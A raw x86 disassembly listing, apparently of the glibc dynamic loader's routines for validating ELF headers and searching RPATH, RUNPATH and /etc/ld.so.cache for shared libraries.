mov edx, dword [0x80aac6c]
test edx, edx
je 0x807ca75
cmp edx, eax
jae 0x807ca75
mov esi, dword [var_30h]
mov dword [esp], esi
call fcn.08053f20
call fcn.08048b20
mov dword [eax], 2
mov dword [var_30h], 0xffffffff
jmp 0x807ca75
mov esi, dword [var_30h]
mov dword [var_8h], 0
mov eax, dword [ebx + 4]
mov dword [esp], esi
mov dword [var_4h], eax
lea esi, [var_2ch]
call fcn.08090150
mov edi, dword [var_30h]
mov dword [var_4h], esi
mov dword [var_8h], 0x20
mov dword [esp], edi
call fcn.08053f70
cmp eax, 0x20
jne 0x807cb53
mov dword [var_40h], esi
jmp 0x807caa0
call fcn.08048b20
mov edx, str.cannot_read_file_data
mov eax, dword [eax]
mov dword [var_34h], eax
mov dword [var_14h], edx
mov edi, dword [arg_8h]
mov eax, dword [var_30h]
mov edx, dword [var_34h]
mov dword [var_10h], 0
mov dword [var_sp_ch], 0
mov dword [var_8h], edi
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.0807b960
lea eax, [ebx + 0x12]
and eax, 0x3ffffc
sub esp, eax
mov dword [var_4h], edx
lea eax, [var_27h]
mov dword [var_8h], 0
mov edx, dword [var_30h]
and eax, 0xfffffff0
mov dword [var_3ch], eax
mov dword [esp], edx
call fcn.08090150
mov esi, dword [var_30h]
mov ecx, dword [var_3ch]
mov dword [var_8h], ebx
mov dword [esp], esi
mov dword [var_4h], ecx
call fcn.08053f70
cmp eax, ebx
jne 0x807cb53
mov edi, dword [var_38h]
movzx ecx, word [edi + 0x2c]
jmp 0x807ca49
mov edx, str.ELF_files_phentsize_not_the_expected_size
jmp 0x807cb62
cmp eax, 2
mov edx, str.only_ET_DYN_and_ET_EXEC_can_be_loaded
je 0x807ca16
jmp 0x807cb62
mov edx, str.ELF_file_version_does_not_match_current_one
jmp 0x807cb62
mov ecx, dword [arg_ch]
cmp dword [ecx + 4], 0x464c457f
je 0x807cc21
mov edx, str.invalid_ELF_header
jmp 0x807cb62
mov esi, dword [var_38h]
cmp byte [esi + 4], 1
jne 0x807caf0
cmp byte [esi + 5], 1
je 0x807cc3e
mov edx, str.ELF_file_data_encoding_not_little_endian
jmp 0x807cb62
mov edi, dword [var_38h]
cmp byte [edi + 6], 1
je 0x807cc51
mov edx, str.ELF_file_version_ident_does_not_match_current_one
jmp 0x807cb62
mov eax, dword [var_38h]
cmp byte [eax + 7], 0
je 0x807cc64
mov edx, str.ELF_file_OS_ABI_invalid
jmp 0x807cb62
mov ecx, dword [var_38h]
mov edx, str.ELF_file_ABI_version_invalid
mov eax, str.internal_error
cmp byte [ecx + 8], 0
cmove edx, eax
jmp 0x807cb62
lea esi, [esi]
mov ebx, dword [ebx]
mov edx, str.file_too_short
mov eax, str.cannot_read_file_data
test ebx, ebx
mov dword [var_34h], ebx
cmovne edx, eax
jmp 0x807cb62
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x88
mov edx, dword [arg_ch]
mov dword [var_7ch], 0
mov eax, dword [arg_14h]
mov dword [var_74h], 0xffffffff
mov dword [var_78h], 0
mov eax, dword [eax]
mov dword [var_70h], eax
mov eax, dword [0x80aa9f0]
add eax, dword [0x80aa9fc]
lea eax, [edx + eax + 0x12]
and eax, 0xfffffffc
sub esp, eax
mov eax, dword [var_70h]
lea edi, [var_1bh]
and edi, 0xfffffff0
mov esi, dword [eax]
lea esi, [esi]
test byte [0x80aac10], 1
mov dword [var_80h], 0
mov dword [var_88h], 0
jne 0x807cf71
mov eax, dword [esi + 0x10]
xor ebx, ebx
mov dword [var_8h], eax
mov eax, dword [esi + 0xc]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.08053740
cmp dword [var_74h], 0xffffffff
mov dword [var_84h], eax
jne 0x807cdd7
cmp ebx, dword [0x80aa9ec]
jae 0x807cd5e
mov esi, esi
cmp dword [esi + ebx*4 + 0x14], 1
jne 0x807ce12
inc ebx
cmp dword [var_74h], 0xffffffff
jne 0x807cdd7
cmp ebx, dword [0x80aa9ec]
jb 0x807cd40
cmp dword [var_74h], 0xffffffff
jne 0x807cdd7
mov eax, dword [var_88h]
test eax, eax
je 0x807cd84
call fcn.08048b20
mov eax, dword [eax]
cmp eax, 2
je 0x807cd84
cmp eax, 0xd
mov edx, 0xffffffff
jne 0x807cdac
add dword [var_70h], 4
mov eax, dword [var_88h]
mov edx, dword [var_70h]
or dword [var_7ch], eax
mov eax, dword [edx]
test eax, eax
mov esi, eax
jne 0x807ccf0
mov edi, dword [var_7ch]
test edi, edi
je 0x807cdb6
mov edx, 0xffffffff
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov esi, dword [eax + 4]
test esi, esi
jne 0x807cdcb
mov eax, dword [arg_14h]
mov dword [eax], 0xffffffff
jmp 0x807cda7
mov eax, dword [eax]
mov dword [esp], eax
call fcn.08051180
jmp 0x807cdc0
mov edx, dword [var_80h]
mov dword [esp], edx
call fcn.08050fe0
mov edx, eax
mov eax, dword [arg_18h]
test edx, edx
mov dword [eax], edx
je 0x807ce05
mov eax, dword [var_80h]
mov dword [esp], edx
mov dword [var_4h], edi
mov dword [var_8h], eax
call fcn.08053770
mov edx, dword [var_74h]
jmp 0x807cdac
mov edx, dword [var_74h]
mov dword [esp], edx
call fcn.08053f20
jmp 0x807cda7
mov edx, dword [0x80aa9e8]
mov eax, dword [edx + ebx*8 + 4]
mov dword [var_8h], eax
mov eax, dword [edx + ebx*8]
mov edx, dword [var_84h]
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.08053740
mov edx, dword [arg_ch]
mov dword [esp], eax
mov dword [var_8h], edx
mov edx, dword [arg_8h]
mov dword [var_4h], edx
call fcn.08053740
mov dword [var_80h], eax
sub dword [var_80h], edi
test byte [0x80aac10], 1
jne 0x807cf5c
mov eax, dword [arg_1ch]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.0807c970
mov edx, dword [esi + ebx*4 + 0x14]
mov dword [var_74h], eax
test edx, edx
jne 0x807ce8c
inc eax
je 0x807cf11
mov dword [esi + ebx*4 + 0x14], 2
mov edx, 2
mov eax, dword [var_88h]
or eax, 1
cmp edx, 2
cmovne eax, dword [var_88h]
cmp dword [var_74h], 0xffffffff
mov dword [var_88h], eax
je 0x807cd4b
mov eax, dword [arg_10h]
test eax, eax
je 0x807cd4b
mov eax, dword [0x80a95f4]
test eax, eax
je 0x807cd4b
mov edx, dword [var_74h]
lea eax, [var_6ch]
mov dword [esp], 3
mov dword [var_8h], eax
mov dword [var_4h], edx
call fcn.08053dc0
test eax, eax
jne 0x807ceef
test byte [var_5bh], 8
jne 0x807cd4b
mov eax, dword [var_74h]
mov dword [esp], eax
call fcn.08053f20
mov dword [var_74h], 0xffffffff
call fcn.08048b20
mov dword [eax], 2
jmp 0x807cd4b
mov eax, dword [var_80h]
lea edx, [var_6ch]
sub eax, dword [arg_ch]
mov byte [eax + edi - 1], 0
mov dword [esp], 3
mov dword [var_4h], edi
mov dword [var_8h], edx
call fcn.08079600
test eax, eax
jne 0x807cf4a
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x4000
je 0x807ce7f
mov edx, 1
mov dword [esi + ebx*4 + 0x14], 1
jmp 0x807ce8c
mov dword [var_4h], edi
mov dword [esp], str.__trying_file_s_n
call fcn.08081c40
jmp 0x807ce5e
mov eax, dword [esi + 4]
cmp dword [var_78h], eax
je 0x807cd0e
mov dword [var_78h], eax
mov edx, dword [var_78h]
mov eax, dword [esi + 8]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov eax, dword [var_70h]
mov dword [esp], eax
call fcn.0807c810
jmp 0x807cd0e
mov esi, esi
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, edx
sub esp, 0x258
mov esi, dword [0x80aac58]
mov dword [var_22ch], ecx
mov dword [var_228h], eax
test esi, esi
je 0x807cff2
test byte [esi + 0x175], 2
jne 0x807cfeb
mov edx, esi
mov eax, ebx
call fcn.08081cd0
test eax, eax
jne 0x807d0c6
test byte [esi + 0x175], 1
je 0x807d62c
mov esi, dword [esi + 0xc]
test esi, esi
jne 0x807cfc4
test byte [0x80aac10], 0x40
jne 0x807d5f0
mov dword [var_4h], 0x2f
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
je 0x807d1bc
mov eax, dword [var_228h]
test eax, eax
je 0x807d18a
mov edx, dword [var_228h]
mov dword [var_4h], ebx
mov dword [esp], edx
call fcn.0807b0c0
test eax, eax
mov dword [var_220h], eax
jne 0x807d0fb
mov eax, dword [arg_ch]
test eax, eax
je 0x807d0e7
test byte [0x80aac11], 2
jne 0x807d0e7
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
je 0x807d0d2
mov dword [var_8h], esi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08053770
test eax, eax
je 0x807d0d2
mov edx, dword [var_228h]
mov ecx, dword [arg_8h]
mov dword [esp], edx
mov edx, ebx
call fcn.0807ea00
sub esp, 4
mov esi, eax
test eax, eax
je 0x807d0d2
or byte [eax + 0x175], 2
mov dword [eax + 0x168], 0x80a3618
mov dword [eax + 0x164], 1
or byte [eax + 0x174], 4
mov eax, esi
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret 0xc
xor ecx, ecx
mov edx, ebx
mov eax, 0xc
mov dword [esp], str.cannot_create_shared_object_descriptor
call fcn.08081200
call fcn.08048b20
mov edx, ebx
xor ecx, ecx
mov dword [esp], str.cannot_open_shared_object_file
mov eax, dword [eax]
jmp 0x807d0e2
lea ecx, [var_21ch]
mov dword [esp], eax
mov dword [var_4h], ecx
call fcn.0807c970
mov dword [var_230h], eax
inc eax
je 0x807d16e
mov eax, dword [0x80aac00]
mov ecx, dword [arg_8h]
lea edx, [var_21ch]
mov dword [var_8h], edx
mov dword [esp], ebx
mov dword [var_224h], eax
mov dword [var_14h], ecx
lea eax, [var_224h]
mov dword [var_1ch], eax
mov ecx, dword [var_230h]
mov eax, dword [arg_10h]
mov dword [var_18h], eax
mov dword [var_4h], ecx
mov eax, dword [var_228h]
mov dword [var_10h], eax
mov eax, dword [var_220h]
mov dword [var_ch], eax
call fcn.0807ba00
jmp 0x807d0c8
mov eax, dword [var_220h]
mov dword [esp], eax
call fcn.08051180
cmp dword [var_230h], 0xffffffff
jne 0x807d116
jmp 0x807d045
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
mov dword [esp], esi
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x807d1b5
mov dword [var_8h], esi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08053770
mov edx, eax
mov eax, edx
jmp 0x807d037
mov dword [esp], ebx
call fcn.08053400
inc eax
test byte [0x80aac10], 1
mov dword [var_234h], eax
jne 0x807d5db
mov eax, dword [var_228h]
mov dword [var_230h], 0xffffffff
test eax, eax
je 0x807d200
mov ecx, dword [var_228h]
mov eax, dword [ecx + 0x8c]
test eax, eax
jne 0x807d2e4
mov esi, dword [var_228h]
test esi, esi
je 0x807d247
lea edi, [esi + 0x180]
mov dword [var_ch], str.RPATH
mov dword [var_8h], 0xf
mov dword [var_4h], edi
mov dword [esp], esi
call fcn.0807b6a0
test al, al
jne 0x807d59c
cmp dword [var_230h], 0xffffffff
mov esi, dword [esi + 0x160]
jne 0x807d247
test esi, esi
jne 0x807d20a
cmp dword [var_230h], 0xffffffff
mov esi, dword [0x80aac58]
je 0x807d274
test byte [0x80aac10], 1
je 0x807d17c
mov dword [esp], 0x809302e
call fcn.08081c40
jmp 0x807d17c
test esi, esi
je 0x807d2d7
movzx eax, byte [esi + 0x174]
and eax, 3
cmp al, 2
je 0x807d2d7
cmp esi, dword [var_228h]
je 0x807d2d7
cmp dword [esi + 0x180], 0xffffffff
je 0x807d2d7
lea eax, [var_220h]
mov ecx, dword [var_22ch]
lea edx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [esp], ebx
lea eax, [esi + 0x180]
mov dword [var_ch], eax
mov dword [var_8h], ecx
mov eax, dword [var_234h]
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
cmp dword [var_230h], 0xffffffff
jne 0x807d256
cmp dword [0x80aa9e0], 0xffffffff
je 0x807d32b
lea eax, [var_220h]
mov ecx, dword [var_22ch]
lea edx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [var_ch], 0x80aa9e0
mov eax, dword [var_234h]
mov dword [esp], ebx
mov dword [var_8h], ecx
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
cmp dword [var_230h], 0xffffffff
jne 0x807d256
mov eax, dword [var_228h]
test eax, eax
je 0x807d378
mov esi, dword [var_228h]
mov edx, dword [var_228h]
mov dword [var_ch], str.RUNPATH
mov dword [var_8h], 0x1d
add esi, 0x1d0
mov dword [esp], edx
mov dword [var_4h], esi
call fcn.0807b6a0
test al, al
jne 0x807d55d
cmp dword [var_230h], 0xffffffff
jne 0x807d256
mov edi, dword [var_22ch]
test edi, edi
jne 0x807d54a
mov eax, ebx
call fcn.0807d980
test eax, eax
mov dword [var_238h], eax
je 0x807d435
mov ecx, dword [var_228h]
test ecx, ecx
je 0x807d3c5
mov ecx, dword [var_228h]
test byte [ecx + 0x1ed], 8
jne 0x807d4d5
mov edx, dword [var_238h]
test edx, edx
je 0x807d435
mov ecx, dword [var_238h]
lea edx, [var_21ch]
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0807c970
mov dword [var_230h], eax
inc eax
je 0x807d442
mov eax, dword [var_238h]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov dword [esp], esi
call fcn.08050fe0
mov edx, eax
xor eax, eax
test edx, edx
je 0x807d427
mov ecx, dword [var_238h]
mov dword [var_8h], esi
mov dword [esp], edx
mov dword [var_4h], ecx
call fcn.08053770
test eax, eax
mov dword [var_220h], eax
je 0x807d4b8
cmp dword [var_230h], 0xffffffff
jne 0x807d256
mov eax, dword [var_228h]
mov esi, dword [var_228h]
test eax, eax
cmove esi, dword [0x80aac58]
test esi, esi
je 0x807d468
test byte [esi + 0x1ed], 8
jne 0x807d256
cmp dword [0x80aa9f4], 0xffffffff
je 0x807d256
lea eax, [var_220h]
mov ecx, dword [var_22ch]
lea edx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], edx
mov dword [var_ch], 0x80aa9f4
mov eax, dword [var_234h]
mov dword [esp], ebx
mov dword [var_8h], ecx
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
jmp 0x807d256
mov eax, dword [var_230h]
mov dword [esp], eax
call fcn.08053f20
mov dword [var_230h], 0xffffffff
jmp 0x807d435
mov dword [var_23ch], str._lib_
mov dword [var_240h], 0
cld
mov eax, dword [var_240h]
mov esi, dword [var_238h]
mov edi, dword [var_23ch]
mov eax, dword [eax*4 + 0x80a35f4]
mov dword [var_244h], eax
cmp eax, eax
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x807d53b
inc dword [var_240h]
mov eax, dword [var_23ch]
mov edx, dword [var_244h]
cmp dword [var_240h], 1
lea eax, [edx + eax + 1]
mov dword [var_23ch], eax
jbe 0x807d4ea
jmp 0x807d3c5
mov dword [var_238h], 0
jmp 0x807d3c5
mov esi, dword [0x80a95f4]
test esi, esi
jne 0x807d435
jmp 0x807d393
lea eax, [var_220h]
mov edx, dword [var_234h]
lea ecx, [var_21ch]
mov dword [var_10h], eax
mov dword [var_14h], ecx
mov dword [var_ch], esi
mov eax, dword [var_22ch]
mov dword [esp], ebx
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0807cca0
mov dword [var_230h], eax
jmp 0x807d378
lea eax, [var_21ch]
mov ecx, dword [var_22ch]
lea edx, [var_220h]
mov dword [var_14h], eax
mov dword [var_10h], edx
mov dword [var_ch], edi
mov eax, dword [var_234h]
mov dword [esp], ebx
mov dword [var_8h], ecx
mov dword [var_4h], eax
call fcn.0807cca0
mov dword [var_230h], eax
jmp 0x807d234
mov dword [var_4h], ebx
mov dword [esp], str.find_library_s__searching_n
call fcn.08081c40
jmp 0x807d1d8
mov eax, dword [var_228h]
test eax, eax
je 0x807cfff
mov edx, dword [var_228h]
mov eax, dword [edx + 4]
cmp byte [eax], 0
jne 0x807d613
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], ebx
mov dword [esp], str._nfile_s___needed_by__s_n
call fcn.08081c40
jmp 0x807cfff
mov edx, dword [esi + 0x50]
test edx, edx
je 0x807cfeb
mov eax, dword [esi + 0x2c]
mov edi, dword [edx + 4]
add edi, dword [eax + 4]
mov dword [esp], ebx
mov dword [var_4h], edi
call fcn.08076e50
test eax, eax
jne 0x807cfeb
mov edx, edi
mov eax, esi
call fcn.0807b200
or byte [esi + 0x175], 1
jmp 0x807d0c6
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
mov esi, ecx
push ebx
sub esp, 0x10
mov eax, dword [arg_8h]
mov dword [var_10h], ecx
mov eax, dword [eax]
cmp eax, 0xffffffff
je 0x807d6ac
mov edi, eax
mov ecx, dword [eax]
lea esi, [esi]
add edi, 4
cmp byte [esi - 9], 0
je 0x807d6b4
mov eax, dword [esi - 0x10]
inc dword [eax + 4]
mov edx, dword [ecx + 0x10]
add dword [eax], edx
mov eax, dword [edi]
test eax, eax
mov ecx, eax
jne 0x807d690
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [esi - 4]
mov edx, dword [esi - 0x10]
lea edx, [edx + eax*8]
inc eax
mov dword [esi - 4], eax
lea ebx, [edx + 8]
mov eax, dword [esi - 8]
mov dword [edx + 8], eax
mov eax, dword [ecx + 0x10]
dec eax
mov dword [var_8h], eax
mov eax, dword [ecx + 0xc]
mov dword [var_4h], eax
mov eax, dword [esi - 8]
mov dword [esp], eax
call fcn.08053740
mov dword [esi - 8], eax
mov byte [eax], 0
mov eax, dword [arg_ch]
inc dword [esi - 8]
mov dword [ebx + 4], eax
jmp 0x807d6a4
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x20
test cl, cl
mov byte [var_15h], cl
mov dword [var_1ch], edx
je 0x807d722
mov dword [edx + 4], 0
mov dword [edx], 0
mov eax, dword [edx + 4]
mov dword [var_10h], 0
lea eax, [edx + eax*8 + 8]
mov dword [var_14h], eax
mov eax, dword [edi + 0x8c]
test eax, eax
jne 0x807d7c0
mov ebx, edi
lea esi, [ebx + 0x180]
mov dword [var_sp_ch], str.RPATH
mov dword [var_8h], 0xf
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.0807b6a0
test al, al
jne 0x807d868
mov ebx, dword [ebx + 0x160]
test ebx, ebx
jne 0x807d743
mov ebx, dword [0x80aac58]
test ebx, ebx
je 0x807d7c0
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
je 0x807d7c0
cmp ebx, edi
je 0x807d7c0
lea esi, [ebx + 0x180]
mov dword [var_sp_ch], str.RPATH
mov dword [var_8h], 0xf
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.0807b6a0
test al, al
jne 0x807d850
lea esi, [esi]
lea ecx, [var_ch]
lea ebx, [edi + 0x1d0]
mov dword [var_4h], 0
mov dword [esp], 0x80aa9e0
call fcn.0807d670
mov dword [var_sp_ch], str.RUNPATH
mov dword [var_8h], 0x1d
mov dword [var_4h], ebx
mov dword [esp], edi
call fcn.0807b6a0
test al, al
jne 0x807d83b
test byte [edi + 0x1ed], 8
je 0x807d822
cmp byte [var_15h], 0
je 0x807d81a
mov eax, dword [var_1ch]
mov ecx, dword [eax]
mov edx, dword [eax + 4]
lea edx, [ecx + edx*8 + 8]
mov dword [eax], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], 0x80aa9f4
call fcn.0807d670
jmp 0x807d806
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], ebx
call fcn.0807d670
jmp 0x807d7fd
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.0807d670
jmp 0x807d7c0
lea ecx, [var_ch]
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.0807d670
jmp 0x807d76d
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 8
mov dword [var_10h], edx
movzx ebx, byte [eax]
test bl, bl
je 0x807d971
movzx ecx, byte [edx]
lea esi, [esi]
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x807d952
lea eax, [ecx - 0x30]
mov edx, 1
cmp al, 9
ja 0x807d941
inc edi
movsx eax, bl
inc dword [var_10h]
movzx ebx, byte [edi]
sub eax, 0x30
mov dword [var_14h], eax
movsx eax, cl
lea esi, [eax - 0x30]
lea eax, [ebx - 0x30]
mov edx, ebx
cmp al, 9
ja 0x807d8fd
lea esi, [esi]
mov ecx, dword [var_14h]
inc edi
movsx edx, dl
movzx ebx, byte [edi]
lea eax, [ecx + ecx*4]
lea eax, [edx + eax*2 - 0x30]
mov dword [var_14h], eax
mov edx, ebx
lea eax, [ebx - 0x30]
cmp al, 9
jbe 0x807d8e0
mov eax, dword [var_10h]
movzx ecx, byte [eax]
lea eax, [ecx - 0x30]
mov edx, ecx
cmp al, 9
ja 0x807d92c
lea esi, [esi]
inc dword [var_10h]
lea eax, [esi + esi*4]
movsx edx, dl
lea esi, [edx + eax*2 - 0x30]
mov eax, dword [var_10h]
movzx ecx, byte [eax]
lea eax, [ecx - 0x30]
mov edx, ecx
cmp al, 9
jbe 0x807d910
cmp dword [var_14h], esi
jne 0x807d94b
test bl, bl
jne 0x807d8a0
movsx edx, bl
movsx eax, cl
sub edx, eax
add esp, 8
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_14h]
sub edx, esi
jmp 0x807d941
lea eax, [ecx - 0x30]
mov edx, 0xffffffff
cmp al, 9
jbe 0x807d941
cmp bl, cl
jne 0x807d939
inc dword [var_10h]
inc edi
mov eax, dword [var_10h]
movzx ebx, byte [edi]
movzx ecx, byte [eax]
jmp 0x807d931
mov eax, dword [var_10h]
movzx ecx, byte [eax]
jmp 0x807d939
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
test byte [0x80aac10], 1
mov dword [var_10h], eax
jne 0x807de2a
mov ecx, dword [0x80aaa00]
test ecx, ecx
je 0x807dd4d
xor eax, eax
cmp ecx, 0xffffffff
je 0x807dab6
mov edx, dword [0x80aaa04]
mov dword [var_24h], 0
cmp edx, 0xffffffff
mov dword [var_28h], edx
mov ebx, edx
je 0x807dc1a
add ecx, dword [0x80aaa08]
sub ecx, edx
mov dword [var_20h], ecx
mov ecx, dword [0x80aac34]
test ecx, ecx
mov dword [var_34h], ecx
je 0x807da10
xor edi, edi
mov esi, str.i386
lea esi, [esi]
mov eax, dword [var_34h]
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x807dc12
inc edi
add esi, 5
cmp edi, 3
jle 0x807d9f0
mov eax, 0xffffffff
cdq
mov dword [var_30h], eax
mov eax, dword [var_30h]
mov dword [var_2ch], edx
and eax, dword [var_2ch]
inc eax
je 0x807da46
movzx ecx, byte [var_30h]
mov esi, 1
xor edi, edi
xor eax, eax
shld edi, esi, cl
shl esi, cl
and ecx, 0x20
cmovne edi, esi
cmovne esi, eax
mov dword [var_30h], esi
mov dword [var_2ch], edi
mov edx, dword [var_28h]
mov dword [var_14h], 0
mov ecx, dword [edx + 0x14]
dec ecx
cmp dword [var_14h], ecx
mov dword [var_18h], ecx
jg 0x807daaa
lea esi, [esi]
mov eax, dword [var_14h]
add eax, dword [var_18h]
mov edx, eax
shr edx, 0x1f
lea esi, [edx + eax]
sar esi, 1
lea eax, [esi + esi*2]
lea edi, [eax*8]
mov eax, dword [ebx + edi + 0x34]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_28h]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
je 0x807dae0
jl 0x807dada
dec esi
mov dword [var_18h], esi
mov edx, dword [var_18h]
cmp dword [var_14h], edx
jg 0x807daaa
mov ebx, dword [0x80aaa04]
jmp 0x807da60
test byte [0x80aac10], 1
jne 0x807dabe
mov eax, dword [var_24h]
add esp, 0x4c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_24h]
test eax, eax
je 0x807dab3
mov eax, dword [var_24h]
mov dword [esp], str.__trying_file_s_n
mov dword [var_4h], eax
call fcn.08081c40
jmp 0x807dab3
inc esi
mov dword [var_14h], esi
jmp 0x807da9a
test esi, esi
mov dword [var_14h], esi
jle 0x807db10
mov ebx, dword [0x80aaa04]
mov eax, dword [ebx + edi + 0x1c]
cmp eax, dword [var_20h]
jae 0x807db16
mov edx, dword [var_28h]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807db10
dec esi
sub edi, 0x18
test esi, esi
jg 0x807dae7
nop
mov ebx, dword [0x80aaa04]
cmp esi, dword [var_14h]
lea eax, [esi + esi*2]
lea ebx, [ebx + eax*8]
lea edi, [ebx + 0x30]
jle 0x807db45
mov eax, dword [edi + 4]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_28h]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807daaa
mov ebx, dword [ebx + 0x30]
cmp ebx, 1
mov dword [var_38h], ebx
je 0x807db60
cmp ebx, 3
je 0x807db60
inc esi
cmp esi, dword [var_18h]
jle 0x807db10
jmp 0x807daaa
mov eax, dword [edi + 8]
mov edx, dword [var_20h]
cmp eax, edx
mov dword [var_3ch], eax
jae 0x807db55
mov ecx, dword [var_24h]
test ecx, ecx
je 0x807db7f
mov ecx, dword [var_38h]
cmp ecx, dword [0x80a95c4]
jne 0x807db55
mov eax, dword [0x80aac6c]
test eax, eax
je 0x807db8d
cmp dword [edi + 0xc], eax
ja 0x807db55
mov edx, dword [var_2ch]
mov eax, dword [var_30h]
not edx
not eax
or edx, eax
je 0x807dc04
mov edx, dword [edi + 0x14]
mov eax, dword [edi + 0x10]
xor ecx, ecx
mov dword [var_40h], edx
mov dword [var_44h], eax
mov ebx, dword [var_40h]
and ebx, 0xf0000
mov edx, ebx
or edx, ecx
je 0x807dbc6
mov edx, dword [var_2ch]
mov eax, dword [var_30h]
xor edx, ebx
xor eax, ecx
or edx, eax
jne 0x807db55
xor edx, edx
mov eax, dword [0x80aa848]
or edx, 0x800f0000
not edx
and edx, dword [var_40h]
not eax
and eax, dword [var_44h]
mov ecx, edx
or ecx, eax
jne 0x807db55
mov edi, dword [var_28h]
mov eax, dword [var_38h]
add edi, dword [var_3ch]
cmp eax, dword [0x80a95c4]
mov dword [var_24h], edi
jne 0x807db55
jmp 0x807daaa
mov eax, dword [edi + 0x10]
mov edx, dword [edi + 0x14]
mov dword [var_44h], eax
mov dword [var_40h], edx
jmp 0x807dbc6
lea eax, [edi + 0x30]
jmp 0x807da15
mov edx, dword [ecx + 0xc]
mov esi, dword [0x80aaa08]
mov dword [var_14h], 0
lea eax, [edx + edx*2]
add esi, ecx
dec edx
lea eax, [ecx + eax*4 + 0x10]
mov dword [var_18h], edx
sub esi, eax
mov dword [var_1ch], eax
cmp dword [var_24h], edx
mov dword [var_20h], esi
jg 0x807daaa
mov eax, dword [var_14h]
add eax, dword [var_18h]
mov edx, eax
shr edx, 0x1f
lea esi, [edx + eax]
sar esi, 1
lea eax, [esi + esi*2]
lea ebx, [eax*4]
mov eax, dword [ecx + ebx + 0x14]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_1ch]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
je 0x807dca0
jl 0x807dc9a
dec esi
mov dword [var_18h], esi
mov edi, dword [var_18h]
cmp dword [var_14h], edi
jg 0x807daaa
mov ecx, dword [0x80aaa00]
jmp 0x807dc48
inc esi
mov dword [var_14h], esi
jmp 0x807dc86
test esi, esi
mov dword [var_14h], esi
jle 0x807dcd0
mov ecx, dword [0x80aaa00]
mov eax, dword [ecx + ebx + 8]
cmp eax, dword [var_20h]
jae 0x807dcd6
mov edx, dword [var_1ch]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807dcd0
dec esi
sub ebx, 0xc
test esi, esi
jg 0x807dca7
nop
mov ecx, dword [0x80aaa00]
cmp esi, dword [var_14h]
lea eax, [esi + esi*2]
lea ebx, [ecx + eax*4]
lea edi, [ebx + 0x10]
jle 0x807dd05
mov eax, dword [edi + 4]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_1ch]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807daaa
mov eax, dword [ebx + 0x10]
cmp eax, 1
je 0x807dd1d
cmp eax, 3
je 0x807dd1d
inc esi
cmp esi, dword [var_18h]
jle 0x807dcd0
jmp 0x807daaa
mov ecx, dword [edi + 8]
cmp ecx, dword [var_20h]
jae 0x807dd12
mov edx, dword [var_24h]
test edx, edx
je 0x807dd45
mov edx, dword [0x80a95c4]
cmp eax, edx
jne 0x807dd12
add ecx, dword [var_1ch]
cmp eax, edx
mov dword [var_24h], ecx
jne 0x807dd12
jmp 0x807daaa
mov edx, dword [0x80a95c4]
jmp 0x807dd36
mov ecx, 1
mov edx, 0x80aaa08
mov eax, str._etc_ld.so.cache
call fcn.080817c0
cmp eax, 0xffffffff
mov ebx, eax
je 0x807de1e
